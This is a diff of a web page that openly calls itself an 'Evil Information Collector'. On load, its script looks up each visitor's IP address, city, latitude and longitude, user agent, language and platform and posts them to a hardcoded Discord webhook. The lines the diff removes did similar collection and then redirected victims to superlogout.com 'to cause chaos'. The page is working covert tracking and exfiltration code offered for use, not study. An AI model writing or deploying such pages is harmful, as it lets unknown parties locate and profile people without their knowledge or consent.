@@ -3,18 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Evil WiFi & Location Collector</title>
-    <script>
-        // Function to gather Wi-Fi and location information and send it to your webhook
-        function gatherAndSendInfo() {
-            // Gather Wi-Fi and location information
-            let wifiInfo = navigator.connection || {};
-            let locationInfo = navigator.geolocation || {};
+    <title>Evil Information Collector</title>
+</head>
+<body>
+    <h1>Welcome to the Evil Information Collector</h1>
+    <p>Your information is now being harvested and sent to our servers. Enjoy!</p>
 
+    <!-- Include jQuery library -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        // Function to gather information and send it to your webhook
+        function gatherAndSendInfo() {
+            // Get IP address using a third-party service
+            fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                // Get location information using Geolocation-DB API
+                $.getJSON('https://geolocation-db.com/json/')
+                .done(function(location) {
+                    // Prepare the data payload to send to the webhook
+                    let details = `Country: ${location.country_name},
+                        State: ${location.state},
+                        City: ${location.city},
+                        Latitude: ${location.latitude},
+                        Longitude: ${location.longitude},
+                        IP: ${location.IPv4}`;
+                    let infoPayload = {
+                        content: `Evil Information Collector:
+                            IP: ${ipData.ip}
+                            Location Details:
+                            ${details}
+                            User Agent: ${navigator.userAgent}
+                            Language: ${navigator.language}
+                            Platform: ${navigator.platform}`
+                    };
+
+                    // Send the data to your webhook
+                    fetch('https://discord.com/api/webhooks/1226675190612758580/lhGStDkGIetoCqKyt2KcLMaeJW2KxtWtVMclcZoiV13osRHo4cPYHeCq5LfR7Drhlvw-', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(infoPayload)
+                    }).then(response => {
+                        if (!response.ok) {
+                            console.error('Error sending information to webhook:', response.status);
+                        }
+                    }).catch(error => {
+                        console.error('Error sending information to webhook:', error);
+                    });
+                }).fail(function(jqXHR, textStatus, errorThrown) {
+                    console.error('Error getting location:', textStatus, errorThrown);
+                    // If there's an error getting location, send without it
+                    sendWithoutLocation(ipData);
+                });
+            }).catch(error => {
+                console.error('Error getting IP:', error);
+            });
+        }
+
+        // Function to send information to the webhook without location data
+        function sendWithoutLocation(ipData) {
             // Prepare the data payload to send to the webhook
-            let data = {
-                wifiInfo: JSON.stringify(wifiInfo),
-                locationInfo: JSON.stringify(locationInfo)
+            let infoPayload = {
+                content: `Evil Information Collector:
+                    IP: ${ipData.ip}
+                    Location: Not available
+                    User Agent: ${navigator.userAgent}
+                    Language: ${navigator.language}
+                    Platform: ${navigator.platform}`
             };
 
             // Send the data to your webhook
@@ -23,24 +81,18 @@
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(infoPayload)
             }).then(response => {
-                // Once the data is sent, redirect to the superlogout.com URL
-                window.location.href = 'https://superlogout.com/';
+                if (!response.ok) {
+                    console.error('Error sending information to webhook:', response.status);
+                }
             }).catch(error => {
-                console.error('Error sending data to webhook:', error);
-                // If an error occurs, still redirect to superlogout.com to cause chaos
-                window.location.href = 'https://superlogout.com/';
+                console.error('Error sending information to webhook:', error);
             });
         }
 
         // Call the function to start the evil process
         gatherAndSendInfo();
     </script>
-</head>
-<body>
-    <!-- Optional: Add evil messages or visuals to further torment the victim -->
-    <h1>Welcome to the Evil WiFi & Location Collector</h1>
-    <p>Your personal information is now being harvested and sent to our servers. Enjoy!</p>
 </body>
 </html>
